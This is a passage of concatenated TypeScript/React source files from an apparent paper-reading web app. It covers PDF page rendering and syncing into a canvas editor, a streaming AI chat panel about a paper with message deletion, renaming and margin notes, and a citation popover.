): Promise<Response> {
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    const response = await fetch(url, {
      method,
      cache: "no-store",
      credentials: "same-origin",
    });
    const delay = retryDelay(response, attempt);
    if (delay === null) return response;
    await new Promise((resolve) => window.setTimeout(resolve, delay));
  }
  throw new Error("The PDF remained busy after retrying.");
}

async function currentPdfVersion(url: string): Promise<string> {
  const response = await fetchPdf(url, "HEAD");
  if (!response.ok) {
    throw new Error(
      `The PDF version could not be checked (${response.status}).`,
    );
  }
  const version = normalizeEtag(response.headers.get("etag"));
  if (!version) throw new Error("The PDF did not include a version.");
  return version;
}

async function renderAndStorePdfPages(
  url: string,
  upload: (blob: Blob, filename: string) => Promise<string>,
): Promise<{ pages: StoredPdfPage[]; version: string }> {
  const response = await fetchPdf(url, "GET");
  if (!response.ok) {
    throw new Error(`The PDF could not be loaded (${response.status}).`);
  }
  const version = normalizeEtag(response.headers.get("etag"));
  if (!version) throw new Error("The PDF did not include a version.");

  const pdfjs = await import("pdfjs-dist");
  pdfjs.GlobalWorkerOptions.workerSrc = new URL(
    "pdfjs-dist/build/pdf.worker.min.mjs",
    import.meta.url,
  ).toString();
  const loadingTask = pdfjs.getDocument({
    data: new Uint8Array(await response.arrayBuffer()),
  });
  const document = await loadingTask.promise;
  const pages: StoredPdfPage[] = [];
  try {
    for (let pageNumber = 1; pageNumber <= document.numPages; pageNumber += 1) {
      const page = await document.getPage(pageNumber);
      const viewport = page.getViewport({ scale: RENDER_SCALE });
      const canvas = window.document.createElement("canvas");
      canvas.width = Math.ceil(viewport.width);
      canvas.height = Math.ceil(viewport.height);
      const context = canvas.getContext("2d");
      if (!context) throw new Error("The PDF page could not be rendered.");
      await page.render({ canvas, canvasContext: context, viewport }).promise;
      const blob = await new Promise<Blob>((resolve, reject) => {
        canvas.toBlob((result) => {
          if (result) resolve(result);
          else reject(new Error("The PDF page image could not be created."));
        }, "image/png");
      });
      pages.push({
        src: await upload(blob, `page-${pageNumber}.png`),
        width: viewport.width / RENDER_SCALE,
        height: viewport.height / RENDER_SCALE,
      });
      page.cleanup();
    }
  } finally {
    await loadingTask.destroy();
  }
  return { pages, version };
}

function applyPdfPages(
  editor: Editor,
  pages: StoredPdfPage[],
  version: string,
): { imported: boolean; obsoleteSources: string[] } {
  const existingPages = pageShapes(editor);
  const imported = existingPages.length === 0;
  const obsoleteSources = new Set<string>();
  let nextY = 0;

  editor.run(
    () => {
      for (const [index, page] of pages.entries()) {
        const pageNumber = index + 1;
        const shapeId = createShapeId(`page-${pageNumber}`);
        const existing = editor.getShape(shapeId);
        const existingImage = existing?.type === "image" ? existing : null;
        const existingAsset = existingImage?.props.assetId
          ? editor.getAsset(existingImage.props.assetId)
          : null;
        if (
          existingAsset?.type === "image" &&
          existingAsset.props.src &&
          existingAsset.props.src !== page.src
        ) {
          obsoleteSources.add(existingAsset.props.src);
        }
        const assetId =
          existingImage?.props.assetId ??
          AssetRecordType.createId(`pdf-page-${pageNumber}`);
        const assetProps = {
          name: `page-${pageNumber}.png`,
          src: page.src,
          w: page.width,
          h: page.height,
          mimeType: "image/png" as const,
          isAnimated: false,
        };
        const meta = {
          papernookPdfPageNumber: pageNumber,
          papernookPdfPageCount: pages.length,
          papernookPdfVersion: version,
        };

        if (editor.getAsset(assetId)) {
          editor.updateAssets([
            { id: assetId, type: "image", props: assetProps },
          ]);
        } else {
          editor.createAssets([
            {
              id: assetId,
              typeName: "asset",
              type: "image",
              meta: {},
              props: assetProps,
            },
          ]);
        }

        if (existingImage) {
          editor.updateShape<TLImageShape>({
            id: existingImage.id,
            type: "image",
            isLocked: true,
            meta,
            props: { assetId, w: page.width, h: page.height },
          });
          nextY = Math.max(nextY, existingImage.y + page.height + PAGE_GAP);
        } else {
          editor.createShape<TLImageShape>({
            id: shapeId,
            type: "image",
            x: 0,
            y: nextY,
            isLocked: true,
            meta,
            props: { assetId, w: page.width, h: page.height },
          });
          nextY += page.height + PAGE_GAP;
        }
      }

      for (const shape of existingPages) {
        const match = PAGE_SHAPE_PATTERN.exec(shape.id);
        if (match && Number(match[1]) > pages.length) {
          editor.deleteShape(shape.id);
        }
      }
    },
    { history: "ignore", ignoreShapeLock: true },
  );
  return { imported, obsoleteSources: [...obsoleteSources] };
}

export async function syncPdfPages(
  editor: Editor,
  url: string,
  upload: (blob: Blob, filename: string) => Promise<string>,
  force = false,
): Promise<PdfPageSyncResult> {
  const checkedVersion = await currentPdfVersion(url);
  if (!force && hasCurrentPages(editor, checkedVersion)) {
    return {
      changed: false,
      imported: false,
      obsoleteSources: [],
      version: checkedVersion,
    };
  }
  const rendered = await renderAndStorePdfPages(url, upload);
  if (!force && hasCurrentPages(editor, rendered.version)) {
    return {
      changed: false,
      imported: false,
      obsoleteSources: [],
      version: rendered.version,
    };
  }
  const result = applyPdfPages(editor, rendered.pages, rendered.version);
  return { changed: true, version: rendered.version, ...result };
}

"use client";

import { useMemo } from "react";
import { StickyNote } from "lucide-react";
import { firstLocator, marginNoteText, wrapNote } from "@/lib/chat/margin-note";
import {
  requestMarginNote,
  type MarginNoteDetail,
} from "@/lib/chat/paper-ref-events";
import type { Bibliography } from "@/lib/pdf/bibliography";
import { Markdown } from "./Markdown";
import { MessageSources } from "./MessageSources";
import styles from "./ChatPanel.module.css";

export interface ChatMessage {
  role: "user" | "assistant";
  content: string;
  images?: string[];
  /** Server timestamp; absent on optimistic bubbles until the next reload. */
  at?: string;
}

interface ChatMessagesProps {
  messages: ChatMessage[];
  /** A send is streaming; the last assistant bubble is still growing. */
  busy: boolean;
  /** Indices mid-vanish animation, about to be removed. */
  vanishing: ReadonlySet<number>;
  bibliography: Bibliography | null;
  /** A PdfReader is mounted to answer in-paper locator buttons; without
   * one they stay undecorated (citations still decorate — the panel's
   * CitationPopover answers them locally). */
  paperRefs: boolean;
  currentOrigin: string;
  paperSourceUrl?: string;
  visionAvailable: boolean;
  /** An editable PdfReader is mounted to receive "Save as note"; without
   * one the action would dispatch into the void. */
  marginNotes: boolean;
  onDelete(index: number): void;
  onRegenerateThree(): void;
}

/** Null when nothing in the answer survives the WinAnsi note format. */
function noteFor(markdown: string): MarginNoteDetail | null {
  const text = wrapNote(marginNoteText(markdown)).join("\n");
  return text ? { text, ref: firstLocator(markdown) } : null;
}

function NoteButton({ markdown }: { markdown: string }) {
  // The whole panel re-renders per keystroke in the composer; the note
  // pipeline only needs to run when the answer itself changes.
  const note = useMemo(() => noteFor(markdown), [markdown]);
  const label = note
    ? "Save as a shared note in the PDF (visible to everyone with this paper)"
    : "Nothing in this answer can be written as a PDF note";
  return (
    <button
      type="button"
      className={`${styles.deleteBtn} ${styles.noteBtn}`}
      onClick={() => note && requestMarginNote(note)}
      disabled={!note}
      aria-label={label}
      title={label}
    >
      <StickyNote aria-hidden="true" />
    </button>
  );
}

export function ChatMessages({
  messages,
  busy,
  vanishing,
  bibliography,
  paperRefs,
  currentOrigin,
  paperSourceUrl,
  visionAvailable,
  marginNotes,
  onDelete,
  onRegenerateThree,
}: ChatMessagesProps) {
  return (
    <>
      {messages.map((message, i) => (
        <div
          key={i}
          data-message-role={message.role}
          hidden={
            message.role === "assistant" &&
            !message.content.trim() &&
            !(busy && i === messages.length - 1)
          }
          className={[
            message.role === "user" ? styles.userMsg : styles.assistantMsg,
            vanishing.has(i) ? styles.vanish : "",
          ].join(" ")}
        >
          {message.at && !busy && (
            <button
              type="button"
              className={styles.deleteBtn}
              onClick={() => onDelete(i)}
              aria-label="Delete message"
              title="Delete message"
            >
              ×
            </button>
          )}
          {marginNotes &&
            message.at &&
            !busy &&
            message.role === "assistant" &&
            message.content.trim() && <NoteButton markdown={message.content} />}
          {message.images?.map((src, j) => (
            // eslint-disable-next-line @next/next/no-img-element
            <img
              key={j}
              className={styles.msgImage}
              src={src.startsWith("data:") ? src : undefined}
              alt="attached crop"
            />
          ))}
          {message.role === "assistant" ? (
            message.content.trim() ? (
              <>
                <Markdown
                  content={message.content}
                  renderThree={!(busy && i === messages.length - 1)}
                  highlightCode={!(busy && i === messages.length - 1)}
                  copyCode={!(busy && i === messages.length - 1)}
                  decorateRefs={!(busy && i === messages.length - 1)}
                  paperRefs={paperRefs}
                  bibliography={bibliography}
                  currentOrigin={currentOrigin}
                  paperSourceUrl={paperSourceUrl}
                  onRegenerateThree={onRegenerateThree}
                />
                {!(busy && i === messages.length - 1) && (
                  <MessageSources
                    content={message.content}
                    currentOrigin={currentOrigin}
                    paperSourceUrl={paperSourceUrl}
                  />
                )}
              </>
            ) : busy && i === messages.length - 1 ? (
              <span
                className={styles.typingIndicator}
                role="status"
                aria-label="Assistant is responding"
              >
                <span aria-hidden="true" />
                <span aria-hidden="true" />
                <span aria-hidden="true" />
              </span>
            ) : null
          ) : (
            <p>{message.content}</p>
          )}
        </div>
      ))}
      {messages.length === 0 && (
        <p className={styles.empty}>
          {visionAvailable
            ? "Ask anything about this paper, or paste a marked-up screenshot and ask “explain this”."
            : "Ask anything about this paper."}
        </p>
      )}
    </>
  );
}

"use client";

import {
  useEffect,
  useRef,
  useState,
  type KeyboardEvent,
  type PointerEvent,
} from "react";
import { Pencil, Trash2 } from "lucide-react";
import {
  BIBLIOGRAPHY_EVENT,
  CHAT_PROMPT_EVENT,
  PAPER_REF_EVENT,
  detailFromDataset,
  parseChatPromptEvent,
  type ChatPromptDetail,
  type PaperRefAction,
} from "@/lib/chat/paper-ref-events";
import {
  matchCitation,
  type BibEntry,
  type Bibliography,
} from "@/lib/pdf/bibliography";
import { ChatMessages, type ChatMessage } from "./ChatMessages";
import { CitationPopover } from "./CitationPopover";
import { HistorySearchDialog, useComposerHistory } from "./ComposerHistory";
import styles from "./ChatPanel.module.css";
import { useConnection } from "@/components/offline/useConnection";

interface ChatHeader {
  id: string;
  title: string;
  createdAt: string;
}

interface ChatPanelProps {
  topic: string;
  slug: string;
  currentOrigin: string;
  paperSourceUrl?: string;
  /** Server-computed hasConfiguredProvider(); false renders a setup hint. */
  aiAvailable: boolean;
  /** Provider capabilities.vision; false disables image attachments. */
  visionAvailable: boolean;
  /** The page mounts an editable PdfReader that saves answers as notes. */
  marginNotes?: boolean;
  /**
   * GET-able server-side bibliography cache for this paper
   * (`/api/v1/papers/<topic>/<slug>/bibliography`): seeds citation
   * decorations before — or without — a PdfReader scan. A later
   * BIBLIOGRAPHY_EVENT always overrides (fresher scan).
   */
  bibliographyEndpoint?: string;
  /**
   * A PdfReader listens to PAPER_REF_EVENT on this page. Without one,
   * in-paper refs stay undecorated and citation activations open a local
   * CitationPopover instead of dispatching into the void.
   */
  hasReader?: boolean;
}

const ACTIVE_CHAT_STORAGE_PREFIX = "papernook:active-chat";

const REGENERATE_THREE_PROMPT =
  "Regenerate the failed interactive 3D visualization from this answer. Preserve its explanatory intent, but produce a fresh threejs block using the provided global THREE and OrbitControls variables without import declarations.";

function activeChatStorageKey(topic: string, slug: string): string {
  return `${ACTIVE_CHAT_STORAGE_PREFIX}:${topic}:${slug}`;
}

function readActiveChat(topic: string, slug: string): string | null {
  try {
    return window.localStorage.getItem(activeChatStorageKey(topic, slug));
  } catch {
    return null;
  }
}

function saveActiveChat(topic: string, slug: string, chatId: string): void {
  try {
    window.localStorage.setItem(activeChatStorageKey(topic, slug), chatId);
  } catch {
    // Chat remains usable when browser storage is unavailable.
  }
}

function clearActiveChat(topic: string, slug: string): void {
  try {
    window.localStorage.removeItem(activeChatStorageKey(topic, slug));
  } catch {
    // Chat remains usable when browser storage is unavailable.
  }
}

export function ChatPanel({
  topic,
  slug,
  currentOrigin,
  paperSourceUrl,
  aiAvailable,
  visionAvailable,
  marginNotes = false,
  bibliographyEndpoint,
  hasReader = false,
}: ChatPanelProps) {
  const connected = useConnection();
  const base = `/api/v1/papers/${topic}/${slug}`;
  const [chats, setChats] = useState<ChatHeader[]>([]);
  const [activeId, setActiveId] = useState<string | null>(null);
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [input, setInput] = useState("");
  const [pastedImages, setPastedImages] = useState<string[]>([]);
  const [busy, setBusy] = useState(false);
  const [deletingChat, setDeletingChat] = useState(false);
  const [renamingChat, setRenamingChat] = useState(false);
  const [vanishing, setVanishing] = useState<ReadonlySet<number>>(new Set());
  const [error, setError] = useState<string | null>(null);
  const [bibliography, setBibliography] = useState<Bibliography | null>(null);
  const [citationPopover, setCitationPopover] = useState<{
    entry: BibEntry;
    anchor: { top: number; bottom: number; left: number; right: number };
  } | null>(null);
  const bibliographyFromEventRef = useRef(false);
  const scrollRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLTextAreaElement>(null);
  const historyDialogRef = useRef<HTMLDialogElement>(null);
  const historySearchRef = useRef<HTMLInputElement>(null);
  const historyResultsRef = useRef<HTMLDivElement>(null);
  const history = useComposerHistory({
    messages,
    input,
    setInput,
    inputRef,
    dialogRef: historyDialogRef,
    searchRef: historySearchRef,
    resultsRef: historyResultsRef,
  });
  const refHoverTimerRef = useRef<number | null>(null);
  const openRequestRef = useRef(0);
  const applyPromptRef = useRef<(detail: ChatPromptDetail) => void>(() => {});

  useEffect(() => {
    void fetch(`${base}/chats`, { credentials: "include" })
      .then((r) => r.json())
      .then((d: { chats?: ChatHeader[] }) => {
        const nextChats = d.chats ?? [];
        const savedChatId = readActiveChat(topic, slug);
        const initialChat =
          nextChats.find((chat) => chat.id === savedChatId) ?? nextChats[0];
        setChats(nextChats);
        if (initialChat) void openChat(initialChat.id);
      });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [topic, slug]);

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight });
  }, [messages]);

  // Canvas "Explain selection" hands crops over via this window event.
  useEffect(() => {
    if (!visionAvailable) return;
    const onAttach = (event: Event) => {
      const dataUrl = (event as CustomEvent<string>).detail;
      if (typeof dataUrl === "string" && dataUrl.startsWith("data:image/")) {
        setPastedImages((imgs) => [...imgs, dataUrl].slice(0, 4));
      }
    };
    window.addEventListener("papernook:attach", onAttach);
    return () => window.removeEventListener("papernook:attach", onAttach);
  }, [visionAvailable]);

  // PdfReader publishes the scanned bibliography once per document; with it
  // in hand, Markdown decorates resolvable citations as interactive.
  useEffect(() => {
    const onBibliography = (event: Event) => {
      const detail = (event as CustomEvent<unknown>).detail;
      if (isBibliographyShaped(detail)) {
        bibliographyFromEventRef.current = true;
        setBibliography(detail);
      }
    };
    window.addEventListener(BIBLIOGRAPHY_EVENT, onBibliography);
    return () => {
      window.removeEventListener(BIBLIOGRAPHY_EVENT, onBibliography);
      clearRefHover();
    };
  }, []);

  // Seed citation decorations from the server-side cache: on the canvas no
  // reader ever scans, and on the paper page the scan lands seconds after
  // mount. A scan that already arrived — or arrives later — wins.
  useEffect(() => {
    if (!bibliographyEndpoint) return;
    const controller = new AbortController();
    void fetch(bibliographyEndpoint, {
      credentials: "include",
      signal: controller.signal,
    })
      .then((response) => (response.ok ? response.json() : null))
      .then((data: unknown) => {
        const cached =
          data && typeof data === "object" && "bibliography" in data
            ? (data as { bibliography: unknown }).bibliography
            : null;
        if (isBibliographyShaped(cached) && !bibliographyFromEventRef.current) {
          setBibliography((current) => current ?? cached);
        }
      })
      .catch(() => undefined);
    return () => controller.abort();
  }, [bibliographyEndpoint]);

  // Other surfaces (a reference popover, a text selection) hand the composer
  // a prompt. The handler closes over the current send(), so it is refreshed
  // every render while the window listener itself is registered once.
  useEffect(() => {
    applyPromptRef.current = (detail) => {
      if (detail.send && aiAvailable && !busy) {
        void send(detail.text);
        return;
      }
      setInput(detail.text);
      history.resetNavigation();
      // ReadingWorkspace reveals the chat in the same dispatch; React
      // commits that after this handler returns, and focus() on a
      // display:none textarea is a no-op — so focus one frame later.
      window.requestAnimationFrame(() => inputRef.current?.focus());
    };
  });

  useEffect(() => {
    const onPrompt = (event: Event) => {
      const detail = parseChatPromptEvent(
        (event as CustomEvent<unknown>).detail,
      );
      if (detail) applyPromptRef.current(detail);
    };
    window.addEventListener(CHAT_PROMPT_EVENT, onPrompt);
    return () => window.removeEventListener(CHAT_PROMPT_EVENT, onPrompt);
  }, []);

  function clearRefHover(): void {
    if (refHoverTimerRef.current !== null) {
      window.clearTimeout(refHoverTimerRef.current);
      refHoverTimerRef.current = null;
    }
  }

  function dispatchRef(target: EventTarget | null, action: PaperRefAction) {
    const button =
      target instanceof Element
        ? target.closest<HTMLButtonElement>(
            "button[data-paper-ref], button[data-citation]",
          )
        : null;
    if (!button) return false;
    const detail = detailFromDataset(button.dataset, action);
    if (!detail) return false;
    // No PdfReader is listening on this page: answer citations locally with
    // an anchored popover instead of dispatching into the void. Click-only:
    // the popover is a focus-taking dialog, and opening it from the hover
    // dwell would steal the caret from the composer mid-sentence.
    if (!hasReader && "citation" in detail) {
      if (action === "preview") return false;
      if (!bibliography) return false;
      const entry = matchCitation(bibliography, detail.citation);
      if (!entry) return false;
      const rect = button.getBoundingClientRect();
      setCitationPopover({
        entry,
        anchor: {
          top: rect.top,
          bottom: rect.bottom,
          left: rect.left,
          right: rect.right,
        },
      });
      return true;
    }
    window.dispatchEvent(new CustomEvent(PAPER_REF_EVENT, { detail }));
    return true;
  }

  // Same interaction grammar as the PDF's own citation hotspots: mouse
  // dwell (180ms) previews, click commits — navigation for in-paper refs,
  // preview for citations (their click IS the preview, matching the PDF).
  // Without a reader the dwell is inert; see the dispatchRef diversion.
  function onRefHover(event: PointerEvent<HTMLDivElement>): void {
    if (event.pointerType !== "mouse") return;
    const target = event.target;
    clearRefHover();
    refHoverTimerRef.current = window.setTimeout(() => {
      dispatchRef(target, "preview");
    }, 180);
  }

  function onRefClick(event: React.MouseEvent<HTMLDivElement>): void {
    clearRefHover();
    dispatchRef(event.target, "goto");
  }

  function onComposerKeyDown(event: KeyboardEvent<HTMLTextAreaElement>): void {
    if (history.onComposerKeyDown(event)) {
      event.preventDefault();
      return;
    }
    if (event.key === "Enter" && !event.shiftKey) {
      event.preventDefault();
      void send();
    }
  }

  async function openChat(id: string): Promise<void> {
    const request = ++openRequestRef.current;
    history.reset();
    saveActiveChat(topic, slug, id);
    setActiveId(id);
    setMessages([]);
    const res = await fetch(`${base}/chats/${id}`, { credentials: "include" });
    const data = (await res.json()) as {
      chat?: { header: ChatHeader; messages: ChatMessage[] };
    };
    if (request !== openRequestRef.current) return;
    const header = data.chat?.header;
    if (header) {
      setChats((current) =>
        current.map((chat) => (chat.id === header.id ? header : chat)),
      );
    }
    setMessages(data.chat?.messages ?? []);
    setVanishing(new Set());
  }

  /** iOS-style vanish: shrink the bubble, then remove it here and on disk. */
  function deleteMsg(index: number): void {
    const chatId = activeId;
    const at = messages[index]?.at;
    if (!chatId || !at || busy) return;
    setVanishing((v) => new Set(v).add(index));
    window.setTimeout(() => {
      void (async () => {
        const res = await fetch(`${base}/chats/${chatId}`, {
          method: "DELETE",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({ index, at }),
        }).catch(() => null);
        setVanishing(new Set());
        if (res?.ok) {
          setMessages((m) => m.filter((_, i) => i !== index));
          history.reset();
        } else {
          // ponytail: stale index (e.g. two rapid deletes) → resync from disk.
          setError("Delete failed.");
          void openChat(chatId);
        }
      })();
    }, 220);
  }

  async function newChat(): Promise<string | null> {
    const res = await fetch(`${base}/chats`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({}),
    });
    const data = (await res.json()) as { chat?: ChatHeader };
    if (data.chat) {
      ++openRequestRef.current;
      history.reset();
      setChats((c) => [data.chat as ChatHeader, ...c]);
      saveActiveChat(topic, slug, data.chat.id);
      setActiveId(data.chat.id);
      setMessages([]);
      return data.chat.id;
    }
    return null;
  }

  async function deleteCurrentChat(): Promise<void> {
    const chatId = activeId;
    const chatIndex = chats.findIndex((chat) => chat.id === chatId);
    const chat = chats[chatIndex];
    if (!chatId || !chat || busy || deletingChat) return;
    if (
      !window.confirm(
        `Delete “${chat.title}”? This permanently deletes the conversation and its attached images.`,
      )
    ) {
      return;
    }

    setDeletingChat(true);
    setError(null);
    try {
      const response = await fetch(`${base}/chats/${chatId}`, {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ entire: true }),
      });
      const payload = (await response.json().catch(() => ({}))) as {
        error?: string;
      };
      if (!response.ok) {
        throw new Error(payload.error ?? "Could not delete the conversation.");
      }

      ++openRequestRef.current;
      const remaining = chats.filter((candidate) => candidate.id !== chatId);
      const nextChat = remaining[Math.min(chatIndex, remaining.length - 1)];
      setChats(remaining);
      setActiveId(null);
      setMessages([]);
      setInput("");
      setPastedImages([]);
      setVanishing(new Set());
      history.reset();
      if (nextChat) {
        await openChat(nextChat.id);
      } else {
        clearActiveChat(topic, slug);
      }
    } catch (cause) {
      setError(
        cause instanceof Error
          ? cause.message
          : "Could not delete the conversation.",
      );
    } finally {
      setDeletingChat(false);
    }
  }

  async function renameCurrentChat(): Promise<void> {
    const chatId = activeId;
    const chat = chats.find((candidate) => candidate.id === chatId);
    if (!chatId || !chat || deletingChat || renamingChat) return;
    const title = window.prompt("Rename conversation", chat.title);
    if (title === null) return;

    setRenamingChat(true);
    setError(null);
    try {
      const response = await fetch(`${base}/chats/${chatId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ title }),
      });
      const payload = (await response.json().catch(() => ({}))) as {
        chat?: ChatHeader;
        error?: string;
      };
      if (!response.ok || !payload.chat) {
        throw new Error(payload.error ?? "Could not rename the conversation.");
      }
      const renamed = payload.chat;
      setChats((current) =>
        current.map((candidate) =>
          candidate.id === renamed.id ? renamed : candidate,
        ),
      );
    } catch (cause) {
      setError(
        cause instanceof Error
          ? cause.message
          : "Could not rename the conversation.",
      );
    } finally {
      setRenamingChat(false);
    }
  }

  function onPaste(event: React.ClipboardEvent): void {
    if (!visionAvailable) return;
    for (const item of event.clipboardData.items) {
      if (!item.type.startsWith("image/")) continue;
      const file = item.getAsFile();
      if (!file) continue;
      const reader = new FileReader();
      reader.onload = () => {
        if (typeof reader.result === "string") {
          setPastedImages((imgs) =>
            [...imgs, reader.result as string].slice(0, 4),
          );
        }
      };
      reader.readAsDataURL(file);
    }
  }

  async function send(forcedContent?: string): Promise<void> {
    if (!connected) {
      setError("Connect to continue this conversation.");
      return;
    }
    const content = (forcedContent ?? input).trim();
    if (!content || busy) return;
    let chatId = activeId;
    if (!chatId) {
      chatId = await newChat();
      if (!chatId) return;
    }
    setBusy(true);
    setError(null);
    setInput("");
    history.reset();
    const images = pastedImages;
    setPastedImages([]);
    setMessages((m) => [
      ...m,
      { role: "user", content, images: images.length ? images : undefined },
      { role: "assistant", content: "" },
    ]);
    try {
      const res = await fetch(`${base}/chats/${chatId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({
          content,
          images: images.length ? images : undefined,
        }),
      });
      if (!res.ok || !res.body) {
        const data = (await res.json().catch(() => ({}))) as { error?: string };
        throw new Error(data.error ?? "Send failed.");
      }
      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      for (;;) {
        const { done, value } = await reader.read();
        if (done) break;
        const chunk = decoder.decode(value, { stream: true });
        setMessages((m) => {
          const next = [...m];
          const last = next[next.length - 1];
          if (!last || last.role !== "assistant") return m;
          next[next.length - 1] = { ...last, content: last.content + chunk };
          return next;
        });
      }
    } catch (e) {
      setError(e instanceof Error ? e.message : "Send failed.");
    } finally {
      setBusy(false);
      // Reload from disk so the new bubbles carry their server timestamps
      // (needed to delete them) and a failed send drops nothing silently.
      void openChat(chatId);
    }
  }

  return (
    <section className={styles.root} aria-label="Paper chat">
      <header className={styles.header}>
        <select
          className={styles.chatSelect}
          value={activeId ?? ""}
          onChange={(e) => void openChat(e.target.value)}
          aria-label="Previous conversations"
          disabled={deletingChat}
        >
          {chats.length === 0 && <option value="">No conversations yet</option>}
          {chats.map((c) => (
            <option key={c.id} value={c.id}>
              {c.title} · {new Date(c.createdAt).toLocaleDateString()}
            </option>
          ))}
        </select>
        <button
          type="button"
          className={styles.renameChatBtn}
          disabled={!activeId || deletingChat || renamingChat}
          onClick={() => void renameCurrentChat()}
          aria-label="Rename conversation"
          title="Rename conversation"
        >
          <Pencil size={18} aria-hidden="true" />
        </button>
        <button
          type="button"
          className={styles.deleteChatBtn}
          disabled={!activeId || busy || deletingChat}
          onClick={() => void deleteCurrentChat()}
          aria-label="Delete conversation"
          title="Delete conversation"
        >
          <Trash2 size={18} aria-hidden="true" />
        </button>
        <button
          type="button"
          className={styles.newBtn}
          disabled={!aiAvailable || deletingChat}
          onClick={() => void newChat()}
        >
          + New
        </button>
      </header>

      <div
        className={styles.messages}
        ref={scrollRef}
        onClick={onRefClick}
        onPointerOver={onRefHover}
        onPointerOut={clearRefHover}
      >
        <ChatMessages
          messages={messages}
          busy={busy}
          vanishing={vanishing}
          bibliography={bibliography}
          paperRefs={hasReader}
          currentOrigin={currentOrigin}
          paperSourceUrl={paperSourceUrl}
          visionAvailable={visionAvailable}
          marginNotes={marginNotes}
          onDelete={deleteMsg}
          onRegenerateThree={() => void send(REGENERATE_THREE_PROMPT)}
        />
      </div>

      {error && (
        <p className={styles.error} role="alert">
          {error}
        </p>
      )}

      {pastedImages.length > 0 && (
        <div className={styles.pastedRow}>
          {pastedImages.map((src, i) => (
            // eslint-disable-next-line @next/next/no-img-element
            <img
              key={i}
              className={styles.pastedThumb}
              src={src}
              alt="pasted"
            />
          ))}
          <button type="button" onClick={() => setPastedImages([])}>
            clear
          </button>
        </div>
      )}

      {aiAvailable ? (
        <div className={styles.inputRow}>
          <textarea
            ref={inputRef}
            className={styles.input}
            value={input}
            onChange={(e) => {
              setInput(e.target.value);
              history.resetNavigation();
            }}
            onPaste={onPaste}
            onKeyDown={onComposerKeyDown}
            placeholder={
              visionAvailable
                ? "Ask about the paper… (paste screenshots here)"
                : "Ask about the paper…"
            }
            rows={2}
          />
          <button
            type="button"
            className={styles.sendBtn}
            onClick={() => void send()}
            disabled={busy || !connected || input.trim().length === 0}
          >
            Send
          </button>
        </div>
      ) : (
        <p className={styles.empty}>
          Chat needs an AI provider. Connect one in Settings — everything else
          works without it.
        </p>
      )}

      {citationPopover && (
        <CitationPopover
          entry={citationPopover.entry}
          anchor={citationPopover.anchor}
          chatPrompts={aiAvailable}
          onClose={() => setCitationPopover(null)}
        />
      )}

      <HistorySearchDialog
        history={history}
        dialogRef={historyDialogRef}
        searchRef={historySearchRef}
        resultsRef={historyResultsRef}
      />
    </section>
  );
}

function isBibliographyShaped(value: unknown): value is Bibliography {
  return (
    typeof value === "object" &&
    value !== null &&
    "style" in value &&
    "entries" in value &&
    Array.isArray((value as { entries: unknown }).entries)
  );
}

"use client";

import { useEffect, useRef, type CSSProperties } from "react";
import type { BibEntry } from "@/lib/pdf/bibliography";
import { requestChatPrompt } from "@/lib/chat/paper-ref-events";
import { AddToLibraryButton } from "@/components/library/AddToLibraryButton";
import styles from "./CitationPopover.module.css";

/**
 * Anchored popover answering a chat citation on surfaces without a mounted
 * PdfReader (the canvas page): where the reader would frame the cited entry
 * on its bibliography page, this shows the entry's text from the cached
 * bibliography, with the same Ask and Add-to-library affordances as the
 * reader's ReferencePreview. Dismissed by Escape, outside pointer, or ×.
 */

interface CitationPopoverProps {
  entry: BibEntry;
  /** Viewport rect of the activated citation button. */
  anchor: { top: number; bottom: number; left: number; right: number };
  /** A chat composer is live; offer "Ask" (mirrors ReferencePreview). */
  chatPrompts: boolean;
  onClose(): void;
}

/** The chat prompt quotes at most this much of the cited entry. */
const ASK_ENTRY_CHARS = 160;
const POPOVER_WIDTH = 360;
const MARGIN = 12;
/** Estimated max popover height used only to pick above/below placement. */
const FLIP_HEIGHT = 260;
/** The resolve API requires at least this many characters. */
const MIN_RESOLVE_CHARS = 12;

export function CitationPopover({
  entry,
  anchor,
  chatPrompts,
  onClose,
}: CitationPopoverProps) {
  const rootRef = useRef<HTMLElement>(null);

  useEffect(() => {
    rootRef.current?.focus();
  }, [entry]);

  useEffect(() => {
    const closeOnEscape = (event: KeyboardEvent) => {
      if (event.key === "Escape") onClose();
    };
    // Outside pointers dismiss; another citation then opens its own popover.
    const closeOnOutsidePointer = (event: globalThis.PointerEvent) => {
      const target = event.target;
      if (
        target instanceof Element &&
        target.closest("[data-citation-popover]")
      )
        return;
      onClose();
    };
    window.addEventListener("keydown", closeOnEscape);
    window.addEventListener("pointerdown", closeOnOutsidePointer);
    return () => {
      window.removeEventListener("keydown", closeOnEscape);
      window.removeEventListener("pointerdown", closeOnOutsidePointer);
    };
  }, [onClose]);

  function askAboutCitation(): void {
    const work = `“${
      entry.text.length > ASK_ENTRY_CHARS
        ? `${entry.text.slice(0, ASK_ENTRY_CHARS).trimEnd()}…`
        : entry.text
    }”`;
    requestChatPrompt(
      `About the cited work ${work}: what does this paper take from it and how does it differ?`,
    );
    onClose();
  }

  const width = Math.min(POPOVER_WIDTH, window.innerWidth - 2 * MARGIN);
  const left = Math.max(
    MARGIN,
    Math.min(anchor.left, window.innerWidth - width - MARGIN),
  );
  const below = anchor.bottom + FLIP_HEIGHT <= window.innerHeight;
  const style = {
    "--citation-popover-left": `${left}px`,
    "--citation-popover-width": `${width}px`,
    "--citation-popover-top": below ? `${anchor.bottom + 8}px` : undefined,
    "--citation-popover-bottom": below
      ? undefined
      : `${window.innerHeight - anchor.top + 8}px`,
  } as CSSProperties;

  return (
    <aside
      ref={rootRef}
      className={`${styles.popover} ${below ? styles.below : styles.above}`}
      style={style}
      data-citation-popover=""
      role="dialog"
      aria-label={`Reference: ${entry.text.slice(0, 80)}`}
      tabIndex={-1}
    >
      <div className={styles.header}>
        <span className={styles.eyebrow}>
